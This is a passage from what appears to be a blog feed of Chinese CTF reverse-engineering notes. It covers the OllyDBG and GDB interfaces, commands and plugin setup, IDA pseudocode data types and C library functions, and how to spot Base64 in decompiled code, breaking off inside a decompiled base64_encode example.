各个寄存器的内容，包括数据寄存器、指针及变址寄存器、段寄存器，以及控制寄存器中的程序状态字寄存器</p></li><li><p><strong>堆栈窗口</strong><br>  显示堆栈的内容。调用 API 函数或子程序时，通过查看堆栈可以知道传递的参数等信息</p></li><li><p><strong>命令行</strong><br>  在原本的 OllyDBG 中是没有命令行的，这个是一个外置的插件，可以方便地在动态调试时输入命令。一般来说，主要是输入下断点或者清除断点的命令。“命令行命令.txt”文件中有详细的命令及功能介绍</p></li></ul><hr><h2 id="OllyDBG-设置"><a href="#OllyDBG-设置" class="headerlink" title="OllyDBG 设置"></a>OllyDBG 设置</h2><h3 id="字体设置"><a href="#字体设置" class="headerlink" title="字体设置"></a>字体设置</h3><blockquote><p>由于默认字体过于难受，可进行如下配置</p></blockquote><ol><li>在界面选项里，将字体设置为 “系统等宽字体”，点击更改，选择好字体、字体大小<br><img src="https://s2.loli.net/2023/03/27/w4KHQ1TxDtU6c97.png" alt="OllyDBG和GDB_OllyDBG界面2.png"></li><li>在初始窗口中，右键 -&gt; 界面选项 -&gt; 全局字体 -&gt; 系统等宽字体<br><img src="https://s2.loli.net/2023/03/27/sS2U3rPpKfkJ7ho.png" alt="OllyDBG和GDB_OllyDBG界面3.png"></li></ol><hr><h2 id="OllyDBG-的常用快捷键"><a href="#OllyDBG-的常用快捷键" class="headerlink" title="OllyDBG 的常用快捷键"></a>OllyDBG 的常用快捷键</h2><table><thead><tr><th align="left">快捷键</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left"><strong>Ctrl + F2</strong></td><td align="left">重新载入程序</td></tr><tr><td align="left"><strong>Alt + F2</strong>&amp;nbsp;</td><td align="left">关闭程序</td></tr><tr><td align="left"><strong>F2</strong></td><td align="left"><code>设置断点</code></td></tr><tr><td align="left"><strong>F4</strong></td><td align="left">执行到光标所在的位置</td></tr><tr><td align="left"><strong>F7</strong></td><td align="left"><code>单步步入（会进入子函数，并停在子函数的第一条命令上）</code></td></tr><tr><td align="left"><strong>F8</strong></td><td align="left"><code>单步步过（会一次运行完子函数）</code></td></tr><tr><td align="left"><strong>F9</strong></td><td align="left">运行程序，遇到断点则停在断点位置</td></tr><tr><td align="left"><strong>F12</strong></td><td align="left">暂停执行程序</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> OllyDBG&amp;GDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> REVERSE </tag>
            
            <tag> OllyDBG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB的基础和使用</title>
      <link href="/2023/03c9687d57.html"/>
      <url>/2023/03c9687d57.html</url>
      
        <content type="html"><![CDATA[<h2 id="GDB的安装与环境配置"><a href="#GDB的安装与环境配置" class="headerlink" title="GDB的安装与环境配置"></a>GDB的安装与环境配置</h2><h3 id="安装-GDB"><a href="#安装-GDB" class="headerlink" title="安装 GDB"></a>安装 GDB</h3><blockquote><p><code>sudo apt-get install gdb</code></p></blockquote><hr><h3 id="安装-gdb-peda"><a href="#安装-gdb-peda" class="headerlink" title="安装 gdb-peda"></a>安装 gdb-peda</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/longld/peda.git ~/peda<span class="token builtin class-name">echo</span> <span class="token string">"source ~/peda/peda.py"</span> <span class="token operator">>></span> ~/.gdbinit</code></pre><hr><h3 id="下载-Pwngdb"><a href="#下载-Pwngdb" class="headerlink" title="下载 Pwngdb"></a>下载 Pwngdb</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/scwuaptx/Pwngdb.git</code></pre><hr><h3 id="下载安装-pwndbg"><a href="#下载安装-pwndbg" class="headerlink" title="下载安装 pwndbg"></a>下载安装 pwndbg</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/pwndbg/pwndbg <span class="token builtin class-name">cd</span> ~/pwndbg./setup.sh</code></pre><hr><h3 id="配置-Pwngdb"><a href="#配置-Pwngdb" class="headerlink" title="配置 Pwngdb"></a>配置 Pwngdb</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~<span class="token function">cp</span> ~/Pwngdb/.gdbinit ~/<span class="token function">vim</span> ~/.gdbinit<span class="token comment"># 在 .gdbinit 的第二行插入：source ~/pwndbg/gdbinit.py</span></code></pre><ul><li>运行 gdb，查看是否出错，是否显示 gdb-peda$</li><li>若命令行在 gdb-peda$ 之前显示有错误，将 .gdbinit 第一行 <code>source ~/peda/peda.py</code> 注掉</li></ul><hr><h2 id="GDB的操作指令"><a href="#GDB的操作指令" class="headerlink" title="GDB的操作指令"></a>GDB的操作指令</h2><table><thead><tr><th>操作</th><th>指令</th></tr></thead><tbody><tr><td><strong>调试程序</strong></td><td><code>gdb &lt;文件名&gt;</code></td></tr><tr><td><strong>下断点</strong></td><td><code>b &lt;函数名&gt;</code></td></tr><tr><td><strong>删除断点</strong></td><td><code>d</code></td></tr><tr><td><strong>执行程序</strong></td><td><code>r</code></td></tr><tr><td><strong>单步执行</strong></td><td><code>n</code></td></tr><tr><td><strong>直接执行到程序结束</strong></td><td><code>c</code></td></tr><tr><td><strong>查看寄存器的值</strong></td><td><code>i r &lt;寄存器名&gt;</code></td></tr><tr><td><strong>修改寄存器的值</strong></td><td><code>set $&lt;寄存器名&gt; = &lt;修改的值&gt;</code></td></tr><tr><td><strong>退出调试</strong></td><td><code>q</code></td></tr><tr><td><strong>单步执行，遇到函数会进入</strong></td><td><code>s</code></td></tr><tr><td><strong>将当前程序执行流跳转到指定行或地址</strong></td><td><code>j</code></td></tr><tr><td><strong>打印变量或寄存器值</strong></td><td><code>p</code></td></tr><tr><td><strong>运行到指定行停下来</strong></td><td><code>u</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> OllyDBG&amp;GDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> REVERSE </tag>
            
            <tag> GDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA中的一些数据类型</title>
      <link href="/2023/03874a8fd2.html"/>
      <url>/2023/03874a8fd2.html</url>
      
        <content type="html"><![CDATA[<h2 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h2><h3 id="后缀"><a href="#后缀" class="headerlink" title="后缀"></a>后缀</h3><table><thead><tr><th>符号后缀</th><th>含义</th></tr></thead><tbody><tr><td><strong>u</strong></td><td>unsigned int</td></tr><tr><td><strong>L</strong></td><td>long</td></tr><tr><td><strong>F</strong></td><td>float</td></tr><tr><td><strong>LL</strong></td><td>long long</td></tr></tbody></table><ul><li><p><strong>0x18</strong>，十六进制数 18，十进制数 24</p></li><li><p><strong>0x47ui64</strong>，十六进制数 47，十进制数 71，类型为 <code>unsigned __int64</code></p></li><li><p><strong>\x1A</strong>，十六进制数 1A，十进制数 26，其中 <code>\x</code> 为转义字符</p><ul><li><code>\x</code> 表示后面的字符是 十六进制数</li><li><code>\0</code> 表示后面的字符是 八进制数</li></ul></li><li><p>在标准的 C++ 代码中没有类似于 <code>ui64</code> 的后缀，是编译器扩展，改为 <code>u</code> 即可</p></li></ul><hr><h3 id="前缀"><a href="#前缀" class="headerlink" title="前缀"></a>前缀</h3><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><strong>int8</strong></td><td align="left">8 位，等于 byte，占 1 个字节</td></tr><tr><td align="left"><strong>int16</strong></td><td align="left">16 位，等于 short，占 2 个字节</td></tr><tr><td align="left"><strong>int32</strong></td><td align="left">32 位，等于 int，占 4 个字节</td></tr><tr><td align="left"><strong>int64</strong></td><td align="left">64 位，等于long，占8个字节</td></tr></tbody></table><ul><li><p>伪代码中的 <code>_DWORD</code> 类型，在 C++ 中需引入头文件 <code>#include &lt;windows.h&gt;</code>，去掉 <code>&#39;_&#39;</code>，改写为 <code>DWORD</code></p></li><li><p>IDA 的伪代码中，有些参数的数据类型并不准确，比如 <code>char 类型</code>、<code>string 类型</code>、<code>_int64 类型</code> 等，需自己判断</p></li></ul><p><strong>(_BYTE *)</strong></p><ul><li>将值或寄存器转换为字节指针，类似于将值分配给 C 变量 <code>byte *</code></li></ul><h2 id="BYTE-从地址中提供的指针中取出一个字节-示例：-如果地址是-12345678，并且该地址存放的是字符串-“hello”-x-BYTE-12345678-counter-如果-counter-是-0，那么-x-将是-‘h’-如果-counter-是-1，那么-x-将是-‘e’"><a href="#BYTE-从地址中提供的指针中取出一个字节-示例：-如果地址是-12345678，并且该地址存放的是字符串-“hello”-x-BYTE-12345678-counter-如果-counter-是-0，那么-x-将是-‘h’-如果-counter-是-1，那么-x-将是-‘e’" class="headerlink" title="*(_BYTE *)- 从地址中提供的指针中取出一个字节- 示例：    如果地址是 12345678，并且该地址存放的是字符串 “hello”    x = *(_BYTE *) (12345678 + counter)    如果 counter 是 0，那么 x 将是 ‘h’    如果 counter 是 1，那么 x 将是 ‘e’"></a><strong>*(_BYTE *)</strong><br>- 从地址中提供的指针中取出一个字节<br>- 示例：<br>    如果地址是 12345678，并且该地址存放的是字符串 “hello”<br>    <code>x = *(_BYTE *) (12345678 + counter)</code><br>    如果 counter 是 0，那么 x 将是 ‘h’<br>    如果 counter 是 1，那么 x 将是 ‘e’</h2><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><table><thead><tr><th align="left">函数</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left"><em><strong>LOWORD()</strong></em></td><td align="left">得到一个 32bit 数的 低 16bit</td></tr><tr><td align="left"><em><strong>HIWORD()</strong></em></td><td align="left">得到一个 32bit 数的 高 16bit</td></tr><tr><td align="left"><em><strong>LOBYTE()</strong></em></td><td align="left">得到一个 16bit 数的 最低（最右边）那个字节 8bit</td></tr><tr><td align="left"><em><strong>HIBYTE()</strong></em></td><td align="left">得到一个 16bit 数的 最高（最左边）那个字节 8bit</td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> IDA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> REVERSE </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA中的一些C语言函数</title>
      <link href="/2023/0373edb5dc.html"/>
      <url>/2023/0373edb5dc.html</url>
      
        <content type="html"><![CDATA[<h2 id="readfsqword"><a href="#readfsqword" class="headerlink" title="readfsqword"></a>readfsqword</h2><blockquote><p><strong><code>__readfsqword(0x28u)</code>——canary 保护机制，防止调试</strong></p></blockquote><ul><li>程序开始时，定义 v6 &#x3D; <code>__readfsqword(0x28u)</code>;</li><li>程序结束时，通过异或或者其他手段检测 v6 的值是否发生改变</li><li>若该值发生改变，则程序终止运行</li></ul><hr><h2 id="alarm"><a href="#alarm" class="headerlink" title="alarm"></a>alarm</h2><blockquote><p><strong><code>unsigned int alarm(unsigned int seconds)</code>——设置信号传送闹钟，干扰调试</strong></p></blockquote><ul><li>用来设置信号 sigalrm 在经过参数 seconds 秒数后发送给目前的进程<br>如果未设置信号 sigalrm 的处理函数，那么 alarm() 默认处理终止进程</li><li>如果在 seconds 秒内再次调用了 alarm 函数设置了新的闹钟，则后面定时器的设置将覆盖前面的设置，即之前设置的秒数被新的闹钟时间取代<br>当参数 seconds 为 0 时，之前设置的定时器闹钟将被取消，并将剩下的时间返回</li></ul><hr><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><blockquote><p><strong><code>ssize_t read(int fd, void *buf, size_t count)</code>——用于从文件描述符对应的文件中读取数据</strong></p></blockquote><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>fd</td><td>文件描述符, 从command line获取数据时，为 0</td></tr><tr><td>buf</td><td>读出数据的缓冲区</td></tr><tr><td>count</td><td>每次读取的字节数（是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移）</td></tr></tbody></table><ul><li>成功：返回读出的字节数<br>失败：返回-1，并设置 errno。如果在调用 read 之前到达文件末尾，则这次 read 返回 0</li><li><mark><strong>read 函数可以取代 scanf 从 command line 读取数据</strong></mark></li></ul><hr><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><blockquote><p><strong><code>ssize_t write(int fd,const void *buf,size_t count)</code>——用于将数据写入到文件描述符对应的文件</strong></p></blockquote><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>fd</td><td>文件描述符（输出到 command line，就是 1）</td></tr><tr><td>buf</td><td>通常是一个字符串，需要写入的字符串</td></tr><tr><td>count</td><td>每次写入的字节数</td></tr></tbody></table><ul><li>成功：返回写入的字节数<br>失败：返回 -1，并设置 errno</li><li><mark><strong>write 函数可以代替 printf，往 command line 打印输出</strong></mark></li></ul><hr><h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><blockquote><p> <strong><code>size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)</code>——从给定流 stream 读取数据到 ptr 所指向的数组中</strong></p></blockquote><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>ptr</td><td>指向带有最小尺寸 size * nmemb 字节的内存块的指针</td></tr><tr><td>size</td><td>要读取的每个元素的大小，以字节为单位</td></tr><tr><td>nmemb</td><td>元素的个数，每个元素的大小为 size 字节</td></tr><tr><td>stream</td><td>指向 FILE 对象的指针，该 FILE 对象指定了一个输入流</td></tr></tbody></table><ul><li>成功读取的元素总数会以 size_t 对象返回，size_t 对象是一个整型数据类型</li><li>如果总数与 nmemb 参数不同，则可能发生了一个错误或者到达了文件末尾</li></ul><hr><h2 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h2><blockquote><p><strong><code>void *memset(void *str, int ch, size_t n)</code>——用于非常量的内存空间初始化</strong></p></blockquote><ul><li>复制字符 ch（一个无符号字符）到参数 str 所指向的字符串的前 n 个字符</li><li>将 str 中当前位置后面的 n个字节 用 ch 替换并返回 str，ch 只有最低的字节起作用</li><li>作用是将某一块内存中的内容全部设置为指定的值， 这个函数通常为新申请的内存做初始化工作</li></ul><hr><h2 id="atoi"><a href="#atoi" class="headerlink" title="atoi"></a>atoi</h2><blockquote><p><strong><code>int atoi(const char *str)</code>——把参数 str 所指向的字符串转换为一个整数（类型为 int 型）</strong></p></blockquote><ul><li>该函数返回转换后的长整数，如果没有执行有效的转换，则返回零</li><li>示例：<br><img src="https://s2.loli.net/2023/03/17/LNAta9drBpuFQfm.png" alt="CTF - Reverse_IDA——C伪代码知识1.png"></li><li>结果：<br><img src="https://s2.loli.net/2023/03/17/ak7pjPw3e1nAEhF.png" alt="CTF - Reverse_IDA——C伪代码知识2.png"></li></ul><hr><h2 id="setvbuf"><a href="#setvbuf" class="headerlink" title="setvbuf"></a>setvbuf</h2><blockquote><p><strong><code>int setvbuf(FILE *stream, char *buffer, int mode, size_t size)</code>——定义流 stream 应如何缓冲，把缓冲区与流相关</strong></p></blockquote><ul><li>如果成功，则该函数返回 0，否则返回非零值</li></ul><hr><h2 id="errno-location"><a href="#errno-location" class="headerlink" title="errno_location"></a>errno_location</h2><blockquote><p><strong><code>int *__errno_location(void)</code>——返回当前线程的变量地址</strong></p></blockquote><ul><li>这个函数的返回值是一个函数指针，这个指针指向线程自己的 errno 的位置，通过对这个指针解引用，就可以访问线程唯一的 errno</li><li><strong>errno 是 error number 的缩写，意味系统调用错误码</strong><br>如果系统调用返回成功，errno 有可能但不一定会置 0；而系统调用出错时，errno 必定会被设为对应的错误编号</li></ul><hr><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><blockquote><p><strong><code>void *malloc(size_t size)</code>——分配所需的内存空间，并返回一个指向它的指针</strong></p></blockquote><ul><li>size 为内存块的大小，以字节为单位</li><li>该函数返回一个指针 ，指向已分配大小的内存。如果请求失败，则返回 NULL</li></ul><hr><h2 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h2><blockquote><p><strong><code>void *calloc(size_t nitems, size_t size)</code>——分配所需的内存空间，并返回一个指向它的指针</strong></p></blockquote><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>nitems</td><td>要被分配的元素个数</td></tr><tr><td>size</td><td>元素的大小</td></tr></tbody></table><ul><li>该函数返回一个指针，指向已分配的内存。如果请求失败，则返回 NULL</li><li>malloc 和 calloc 之间的不同点：<br><mark>malloc 不会设置内存为零；而 calloc 会设置分配的内存为零</mark></li></ul><hr><h2 id="gmpz-init-set-str（等同于-mpz-init-set-str）"><a href="#gmpz-init-set-str（等同于-mpz-init-set-str）" class="headerlink" title="gmpz_init_set_str（等同于 mpz_init_set_str）"></a>gmpz_init_set_str（等同于 mpz_init_set_str）</h2><blockquote><p><strong><code>int mpz_init_set_str (mpz_t rop, char *str, int base)</code>——将 str 字符数组以 base 指定的进制解读成数值并写入 rop 所指向的内存</strong></p><p><strong>GMP 又叫 GNU 多精度算术库，是一个提供了很多操作高精度的大整数、浮点数运算的算术库，几乎没有什么精度方面的限制，功能丰富</strong></p></blockquote><ul><li>这三个参数分别是：</li></ul><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>rop</td><td>多精度整数变量</td></tr><tr><td>str</td><td>字符串</td></tr><tr><td>base</td><td>进制</td></tr></tbody></table><ul><li>示例：<br><code>mpz_powm(op1,op2,op3,op4)； // 求幂模函数</code>，即：<code>op1 = op2 ^ op3 mod op4</code></li></ul><hr><h2 id="gmpz-powm（等同于-mpz-powm）"><a href="#gmpz-powm（等同于-mpz-powm）" class="headerlink" title="gmpz_powm（等同于 mpz_powm）"></a>gmpz_powm（等同于 mpz_powm）</h2><blockquote><p><strong><code>void mpz_powm (mpz_t rop, const mpz_t base, const mpz_t exp, const mpz_t mod)</code>——计算 base 的 exp 次方，并对 mod 取模，最后将结果写入 rop 中</strong></p></blockquote><ul><li>运算的过程和 RSA 的加密过程一样</li><li>示例：<br><code>mpz_init_set_str(b, “200000”, 10)； // 即：b=200000，十进制</code></li></ul><hr><h2 id="gmpz-cmp（等同于-mpz-cmp）"><a href="#gmpz-cmp（等同于-mpz-cmp）" class="headerlink" title="gmpz_cmp（等同于 mpz_cmp）"></a>gmpz_cmp（等同于 mpz_cmp）</h2><blockquote><p><strong><code>mpz_cmp(mpz_t num1, mpz_t num_2)</code>——比较两个数</strong></p></blockquote><ul><li>示例：<br><code>mpz_cmp(b, c)； // 若 b 大于 c，返回1；若 b 等于 c，返回0；若 b 小于 c，返回-1</code></li></ul><hr><h2 id="strcat"><a href="#strcat" class="headerlink" title="strcat"></a>strcat</h2><blockquote><p><strong><code>char *strcat(char *dest, const char *src)</code>——把 src 所指向的字符串追加到 dest 所指向的字符串的结尾</strong></p></blockquote><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>dest</td><td>指向目标数组，该数组包含了一个 C 字符串，且足够容纳追加后的字符串</td></tr><tr><td>src</td><td>指向要追加的字符串，该字符串不会覆盖目标字符串</td></tr></tbody></table><ul><li>该函数返回一个指向最终的目标字符串 dest 的指针</li></ul><hr><h2 id="time"><a href="#time" class="headerlink" title="time"></a>time</h2><blockquote><p><strong><code>time_t time(time_t *timer)</code>——得到当前日历时间或者设置日历时间</strong></p></blockquote><ul><li>参数说明:<br>timer &#x3D; NULL 时得到当前日历时间（从1970-01-01 00:00:00到现在的秒数）<br>timer &#x3D; 时间数值 时，用于设置日历时间，time_t 是一个 unsigned long 类型<br>如果 timer 不为空，则返回值也存储在变量 timer 中</li><li>函数返回：当前日历时间</li></ul><hr><h2 id="localtime"><a href="#localtime" class="headerlink" title="localtime"></a>localtime</h2><blockquote><p><strong><code>struct tm *localtime(const time_t *timer)</code>——使用 timer 的值来填充 tm 结构。timer 的值被分解为 tm 结构，并用本地时区表示</strong></p></blockquote><ul><li>timer 是指向表示日历时间的 time_t 值的指针</li><li>该函数返回指向 tm 结构的指针，该结构带有被填充的时间信息</li><li>tm 结构的细节：<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">tm</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">int</span> tm_sec<span class="token punctuation">;</span>         <span class="token comment">/* 秒，范围从 0 到 59 */</span>   <span class="token keyword">int</span> tm_min<span class="token punctuation">;</span>         <span class="token comment">/* 分，范围从 0 到 59 */</span>   <span class="token keyword">int</span> tm_hour<span class="token punctuation">;</span>        <span class="token comment">/* 小时，范围从 0 到 23 */</span>   <span class="token keyword">int</span> tm_mday<span class="token punctuation">;</span>        <span class="token comment">/* 一月中的第几天，范围从 1 到 31 */</span>   <span class="token keyword">int</span> tm_mon<span class="token punctuation">;</span>         <span class="token comment">/* 月份，范围从 0 到 11 */</span>   <span class="token keyword">int</span> tm_year<span class="token punctuation">;</span>        <span class="token comment">/* 自 1900 起的年数 */</span>   <span class="token keyword">int</span> tm_wday<span class="token punctuation">;</span>        <span class="token comment">/* 一周中的第几天，范围从 0 到 6 */</span>   <span class="token keyword">int</span> tm_yday<span class="token punctuation">;</span>        <span class="token comment">/* 一年中的第几天，范围从 0 到 365 */</span>   <span class="token keyword">int</span> tm_isdst<span class="token punctuation">;</span>       <span class="token comment">/* 夏令时 */</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ul><hr><h2 id="pthread-create"><a href="#pthread-create" class="headerlink" title="pthread_create"></a>pthread_create</h2><blockquote><p><strong><code>int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg)</code>——用来创建线程，在线程创建以后，就开始运行相关的线程函数</strong></p></blockquote><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>pthread_t *thread</code></td><td align="left">新创建的线程 ID 指向的内存单元。pthread_t 是一种用于表示线程的数据类型，每一个 pthread_t 类型的变量都可以表示一个线程</td></tr><tr><td align="left"><code>const pthread_attr_t *attr</code></td><td align="left">用于手动设置新建线程的属性，例如线程的调用策略、线程所能使用的栈内存的大小等。大部分场景中，我们都不需要手动修改线程的属性，将 attr 参数赋值为 NULL，pthread_create() 函数会采用系统默认的属性值创建线程</td></tr><tr><td align="left"><code>void *(*start_routine) (void *)</code></td><td align="left">新创建的线程从start_rtn函数的地址开始运行。形参和返回值的类型都必须为 void* 类型</td></tr><tr><td align="left"><code>void *arg</code></td><td align="left">指定传递给 start_routine 函数的实参，当不需要传递任何数据时，将 arg 赋值为 NULL 即可</td></tr></tbody></table><ul><li>如果成功创建线程，pthread_create() 函数返回数字 0，反之返回非零值</li><li>各个非零值都对应着不同的宏，指明创建失败的原因，常见的宏有以下几种：<ol><li><strong>EAGAIN</strong>：系统资源不足，无法提供创建线程所需的资源</li><li><strong>EINVAL</strong>：传递给 pthread_create() 函数的 attr 参数无效</li><li><strong>EPERM</strong>：传递给 pthread_create() 函数的 attr 参数中，某些属性的设置为非法操作，程序没有相关的设置权限</li></ol></li></ul><hr><h2 id="pthread-join"><a href="#pthread-join" class="headerlink" title="pthread_join"></a>pthread_join</h2><blockquote><p><strong><code>int pthread_join(pthread_t thread, void * * retval)</code>——获取某个线程执行结束时返回的数据</strong></p></blockquote><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left">thread</td><td align="left">指定接收哪个线程的返回值</td></tr><tr><td align="left">retval</td><td align="left">接收到的返回值。如果 thread 线程没有返回值，或者不需要接收 thread 线程的返回值，可以将 retval 参数置为 NULL</td></tr></tbody></table><ul><li><code>pthread_join()</code> 函数会一直阻塞调用它的线程，直至目标线程执行结束（接收到目标线程的返回值），阻塞状态才会解除</li><li>如果 <code>pthread_join()</code> 函数成功等到了目标线程执行结束（成功获取到目标线程的返回值），返回值为数字 0；反之如果执行失败，函数会根据失败原因返回相应的非零值，每个非零值都对应着不同的宏，例如：  <ol><li><strong>EDEADLK</strong>：检测到线程发生了死锁</li><li><strong>EINVAL</strong>：分为两种情况，要么目标线程本身不允许其它线程获取它的返回值，要么事先就已经有线程调用 pthread_join() 函数获取到了目标线程的返回值</li><li><strong>ESRCH</strong>：找不到指定的 thread 线程</li></ol></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> IDA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> REVERSE </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA中加密算法的特征</title>
      <link href="/2023/03b0e13569.html"/>
      <url>/2023/03b0e13569.html</url>
      
        <content type="html"><![CDATA[<h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><blockquote><p><strong>转换步骤</strong>：<br>第1步，将待转换的字符串，每 3个字节分为一组，每个字节占 8bit，共 24个二进制位<br>第2步，将上面的 24个二进制位，每 6个字节做为一组，共分为 4组（<em>若最后一组字符数不足三个，用 ‘&#x3D;’ 补充</em>）<br>第3步，在每组前面添加两个 0，每组由 6个变为 8个二进制位，总共 32个二进制位，即 4个字节<br>第4步，根据 Base64 编码对照表获得对应的值</p><p><strong>base64算法解码过程</strong><br>去掉所有的等号，查表将字符转为二进制的索引值，最后每 8位一组计算 ASCii 码还原字符，<mark>不足 8位则丢弃</mark></p><p><strong>原始 Base64 码表</strong>：<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code></p></blockquote><blockquote><p><strong>Base64 &amp; Base32 &amp; Base16</strong><br><em><strong>Base64</strong></em> 就是用每 <code>6位二进制（2的6次幂就是64）</code> 来表示一个字符，因此称为 Base64<br>同理：<em><strong>Base32</strong></em> 就是用 <code>5位二进制（2的5次幂就是32）</code>，<em><strong>Base16</strong></em> 就是用 <code>4位二进制（2的4次幂就是16）</code></p><p><strong>Base64 为什么使用 3个字节作为一组呢？</strong><br>因为 6 和 8 的最小公倍数为 24，三个字节正好 24个二进制位，每 6bit 为一组，恰好能够分为 4组</p></blockquote><hr><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol><li>Base64 要用到 Base64码表，可以在程序中找到连续的字符串：<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code></li><li>根据 Base64 加密原理，代码中必然存在<mark>根据余数个数判断是否添加等号</mark>的代码<br>字符 ‘&#x3D;’ 的 ASCii 码：61（0x3D），也有可能直接索引码表里面的 ‘&#x3D;’</li><li>识别代码中对数据的左移右移操作<br><code>((a[0] &amp; 3) &lt;&lt; 4) | (a[1] &gt;&gt; 4 )</code> 和 <code>(16 * (a[0] &amp; 3)) | (a[1] / 16)</code> 是等价操作，都表示取 <code>a[0]</code> 后 2位与 <code>a[1]</code> 前 4位拼接，是 Base64 中的常见操作</li><li>最主要的是理解编码解码原理，比如编码时通常都会用 3个字节一组来处理比特位数据</li></ol><hr><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul><li><p>以下图的表格为示例，具体分析一下整个过程：<br><img src="https://s2.loli.net/2023/03/17/KR5dFYpn3VcDOBs.jpg" alt="加密算法的函数特征1.jpeg"></p><ol><li>第1步，根据 ‘M’、’a’、’n’ 对应的 ASCii 码值分别为 77，97，110，对应的二进制值是：01001101、01100001、01101110，由此组成一个 24位的二进制字符串</li><li>第2步，如图红色框，将 24位每 6位二进制位一组分成 4组</li><li>第3步，在上面每一组前面补两个 0，扩展成 32个二进制位：<mark>00</mark>010011、<mark>00</mark>010110、<mark>00</mark>000101、<mark>00</mark>101110</li><li>第4步，四组 8bit 分别对应的值（ <strong>Base64 编码索引</strong>）为：19、22、5、46，在 Base64 编码表中进行查找，分别对应：’T’、’W’、’F’、’u’，因此 “Man” 经过 Base64 编码之后就变为：”TWFu”</li></ol></li><li><p><strong>位数不足的情况</strong><br>  位数不足用 ‘&#x3D;’ 补充，总共有两种情况：</p><ol><li>最后一组只有一个字符</li><li>最后一组有两个字符<br><img src="https://s2.loli.net/2023/03/17/LcGV3tyPHXz7rpO.png" alt="加密算法的函数特征2.png"></li></ol></li></ul><hr><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>__fastcall <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-54h]  </span>    <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-50h]  </span>    <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-4Ch]  </span>    <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-4Ch]  </span>    <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-4Ch]  </span>    <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-48h]  </span>    <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment">// 